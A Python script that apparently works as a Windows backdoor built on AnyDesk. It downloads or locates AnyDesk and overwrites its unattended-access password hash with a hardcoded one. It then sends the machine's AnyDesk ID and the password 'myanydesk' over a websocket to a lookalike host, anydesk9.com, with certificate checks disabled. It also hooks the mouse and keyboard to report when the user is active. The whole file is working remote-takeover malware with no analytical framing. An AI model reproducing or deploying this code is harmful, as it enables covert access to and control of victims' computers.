import os
import urllib.request
import requests
import subprocess
from time import sleep
from shutil import copyfile
import websocket
import ssl
import json
import threading
from pynput import mouse
from pynput import keyboard
import datetime
import sys
confDir = ""
confPath = ""
tempConfPath = ""

anydeskPath = ""
sysDriver = os.getenv("SystemDrive")

old_pwd_hash = ""
old_pwd_salt = ""
new_pwd_hash = "ad.anynet.pwd_hash=733f8f71e9ef61461b37a76972d0479d42b744b1ba6180b758325815368afa2d\n"
new_pwd_salt = "ad.anynet.pwd_salt=c116e7b1e1839920e1f3c360337b4181\n"

anydeskID = ""
eventData = None
preEventData = None
ws = None

if(os.path.exists("run.log")):
    try:
        os.remove("run.log")
    except:
        sys.exit(1)

logf = open("run.log", "w")
    
def init():    
    global confDir, confPadth, tempConfPath, anydeskPath, sysDriver

    if os.path.isdir(sysDriver + '\\ProgramData\\AnyDesk'):
        confDir = sysDriver + "\\ProgramData\\AnyDesk"
        anydeskPath = sysDriver + "\\Program Files (x86)\\AnyDesk\\AnyDesk.exe"
#        print(confDir);
#        print(anydeskPath)
        logf.write("found anydesk\n")
    else:
        confDir = os.getenv('APPDATA') + "\\AnyDesk"
        downloadAnydesk()
    confPath = confDir + "\\service.conf"
    tempConfPath = confDir + "\\service_temp.conf"

    getID()
 

def downloadAnydesk():
    global confDir, confPath, tempConfPath, anydeskPath, sysDriver
    
    downloadDir = os.path.expanduser('~') + "\\Downloads"
    anydeskPath = downloadDir + "\\AnyDesk.exe"
    if os.path.isfile(anydeskPath):
        logf.write( 'found anyesk...' );
        logf.write('\n');
    else:
        logf.write('downloading anydesk...')
        logf.write('\n');
        logf.flush()
        url = "https://download.anydesk.com/AnyDesk.exe"
        #requests.get(url, allow_redirects=True)
        urllib.request.urlretrieve(url, anydeskPath)
        logf.write('completed downloading')
        logf.write('\n');
        logf.flush()

def getID():
    global confDir, anydeskID 
    sysconf = confDir + "\\system.conf"
    if os.path.isfile(sysconf) == False:
       startAnydesk()
       while True:
            if os.path.isfile(sysconf) == True:
                break;
    print("BBB")

    while anydeskID == "":
        sleep(1)
        with open(sysconf, 'r') as f:
            data = f.readlines()    
            print(data)
            print("a\n")
            for ii in range(len(data)):
                if data[ii].startswith("ad.anynet.id="):
                    anydeskID=data[ii][13:].strip()

    if anydeskID == "":
        logf.write('Could not find ID...')
        logf.write('\n');
    else:
        logf.write('AnyDesk ID is ')
        logf.write(anydeskID);
        logf.write('\n');        
    logf.flush()

def changePassword():
    global confDir, confPath, tempConfPath, anydeskPath, sysDriver
    global old_pwd_hash, old_pwd_salt, new_pwd_hash, new_pwd_salt
    
    if not os.path.exists(tempConfPath):
        copyfile(confPath, tempConfPath)

    with open(confPath, 'r') as f:
        data = f.readlines()
        bChanged = False
        for ii in range(len(data)):
            if data[ii].startswith("ad.anynet.pwd_hash="):
                old_pwd_hash = data[ii]
                data[ii] = new_pwd_hash
                bChanged = True
            elif data[ii].startswith("ad.anynet.pwd_salt="):
                old_pwd_salt = data[ii]
                data[ii] = new_pwd_salt
        if bChanged == False:
            data.append(new_pwd_hash)
            data.append(new_pwd_salt)
        f.close()

    with open(confPath, "w") as f:
        f.writelines(data)
        f.close()

def restorePassword():
    global confDir, confPath, tempConfPath, anydeskPath, sysDriver
    global old_pwd_hash, old_pwd_salt, new_pwd_hash, new_pwd_salt
    
    if os.path.exists(tempConfPath):
        if os.path.exists(confPath):
            os.remove(confPath)
        os.rename(tempConfPath, confPath)

    
    # if old_pwd_hash != "" and old_pwd_salt != "":
    #     with open(confPath, 'r') as f:
    #         data = f.readlines()
    #         bChanged = False
    #         for ii in range(len(data)):
    #             if data[ii].startswith("ad.anynet.pwd_hash="):
    #                 data[ii] = old_pwd_hash                
    #             elif data[ii].startswith("ad.anynet.pwd_salt="):                
    #                 data[ii] = old_pwd_salt        
    #         f.close()

    #     with open(confPath, "w") as f:
    #         f.writelines(data)
    #         f.close()

def killAnydesk():
    os.system("taskkill /im AnyDesk.exe")
    logf.write('please wait seconds...')
    logf.write('\n')
    sleep(15)

def startAnydesk():
    logf.write('starting anydesk...')
    logf.write('\n')
    os.startfile(anydeskPath)
    sleep(5)


# websocket ...
def on_message(ws, message):
    global anydeskID
    data = json.loads(message)
    if (data.get('action') == 'command_run'):
        logf.write('running anydesk...')
        logf.write('\n')
        killAnydesk()
        changePassword()
        startAnydesk()
        sendMessage(ws, 'started', {'anydesk_id': anydeskID, 'password':'myanydesk'})
    elif (data.get('action') == 'command_close'):
        logf.write('stopping anydesk...\n')
        killAnydesk()
        logf.write('restoring password...\n')
        restorePassword()


def on_error(ws, error):
    logf.write('error');
    logf.write('\n')

def on_close(ws, close_status_code, close_msg):
    logf.write('### closed\n')
    logf.write('\n')
    runService()

def on_open(ws):
    global anydeskID
    logf.write('connected...\n')
    data = {'anydesk_id': anydeskID}
    sendMessage(ws, 'connect', data)

def sendMessage(ws, actionType, data):
    resp = json.dumps({'action': actionType, 'data': data})
    logf.write(resp)
    logf.write('\n')
    logf.flush()
    ws.send(resp)

def runService():
    global anydeskID, ws
    while anydeskID == "":    
        init()
        logf.write("init finish")
        logf.flush()
        if anydeskID != "":
            break;
        else:
            sleep(30)
    logf.write('try to connect websocket ....\n')
    logf.flush();

    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("wss://anydesk9.com:5031",
        on_open=on_open,on_message= on_message,on_error=on_error,on_close=on_close)
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})

# mouse events...
def on_move(x, y):
    global eventData
    curtime = datetime.datetime.utcnow();
    curtime = curtime.strftime("%d/%m/%Y %H:%M:%S")    
    eventData = {'event':'mouse', 'time':curtime}    

def on_click(x, y, button, pressed):
    global eventData
    curtime = datetime.datetime.utcnow();
    curtime = curtime.strftime("%d/%m/%Y %H:%M:%S")    
    eventData = {'event':'mouse', 'time':curtime}

def on_scroll(x, y, dx, dy):
    global eventData
    curtime = datetime.datetime.utcnow();
    curtime = curtime.strftime("%d/%m/%Y %H:%M:%S")    
    eventData = {'event':'mouse', 'time':curtime}

#Collect events until released
# with mouse.Listener(
#     on_move=on_move,
#     on_click=on_click,
#     on_scroll=on_scroll) as listener:
#     listener.join()

# ...or, in a non-blocking fashion:
listener1 = mouse.Listener(
    on_move=on_move,
    on_click=on_click,
    on_scroll=on_scroll)
listener1.start()

# keyboard events...
def on_press(key):
    global eventData
    curtime = datetime.datetime.utcnow();
    curtime = curtime.strftime("%d/%m/%Y %H:%M:%S")    
    eventData = {'event':'keyboard', 'time':curtime}

def on_release(key):
    global eventData
    curtime = datetime.datetime.utcnow();
    curtime = curtime.strftime("%d/%m/%Y %H:%M:%S")    
    eventData = {'event':'keyboard', 'time':curtime}

# Collect events until released
# with keyboard.Listener(
#         on_press=on_press,
#         on_release=on_release) as listener:
#     listener.join()

# ...or, in a non-blocking fashion:
listener2 = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener2.start()

def sendEvent(name):
    global ws, eventData, preEventData
    while True:
        sleep(3)
        if (ws == None) or (eventData == None):
            continue
        if (preEventData != None) and (preEventData.get('time') == eventData.get('time')):
            continue
        preEventData = eventData
        try:
            sendMessage(ws, 'event', eventData)
        except:
            continue


x = threading.Thread(target=sendEvent, args=(1,))
x.start()

if __name__ == "__main__":
    runService()



    
